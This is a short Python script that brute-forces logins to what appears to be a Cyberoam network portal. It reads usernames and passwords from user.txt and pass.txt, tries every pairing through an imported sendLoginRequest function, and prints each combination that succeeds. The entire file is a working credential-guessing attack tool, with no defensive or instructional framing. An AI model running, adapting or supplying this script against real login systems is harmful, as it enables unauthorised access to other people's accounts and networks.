#!/usr/bin/env python

from __future__ import print_function
from cyberoam import sendLoginRequest

passtxt = open("pass.txt").read()
pass_list = passtxt.split('\n')

usertxt = open("user.txt").read()
user_list = usertxt.split('\n')

def brute_force():
	print('Searching...')
	hits = 0
	for user in user_list:
		for pwd in pass_list:
			response = sendLoginRequest(user, pwd)
			if response == True:
				hits = hits + 1
				print(user + ' ' + pwd + '\n')
	if hits == 0:
		print('No Valid Combinations Found!')
	else:
		print('Total Hits = ' + str(hits))

brute_force()
